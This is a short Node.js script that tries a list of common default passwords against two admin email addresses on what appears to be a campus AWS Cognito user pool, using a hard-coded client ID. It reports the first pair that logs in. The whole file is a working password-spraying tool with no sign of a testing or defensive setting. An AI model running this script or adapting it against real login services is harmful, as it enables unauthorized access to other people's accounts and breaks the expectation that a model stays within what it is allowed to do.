const https = require('https');

const COGNITO_CLIENT_ID = '3kv2vgpkklqtlpfom2t72dn29n';

async function testPassword(email, password) {
  return new Promise((resolve) => {
    const payload = JSON.stringify({
      AuthFlow: 'USER_PASSWORD_AUTH',
      ClientId: COGNITO_CLIENT_ID,
      AuthParameters: {
        USERNAME: email,
        PASSWORD: password
      }
    });

    const req = https.request({
      hostname: `cognito-idp.us-east-1.amazonaws.com`,
      port: 443,
      path: '/',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-amz-json-1.1',
        'X-Amz-Target': 'AWSCognitoIdentityProviderService.InitiateAuth'
      }
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          resolve({ email, password, status: res.statusCode, data: parsed });
        } catch (e) {
          resolve({ email, password, status: res.statusCode, data });
        }
      });
    });
    req.write(payload);
    req.end();
  });
}

async function main() {
  const passwords = ['TempPassword123!', 'Password@123', 'Password123!', 'admin123', 'Admin@123', 'Admin@123456'];
  const emails = ['admin@campus.local', 'admin@campus.edu'];

  for (const email of emails) {
    for (const pwd of passwords) {
      const res = await testPassword(email, pwd);
      if (res.status === 200 && res.data.AuthenticationResult) {
        console.log(`✓ SUCCESS: ${email} with password: ${pwd}`);
        return;
      }
    }
  }
  console.log('No matching password found among candidates.');
}

main();
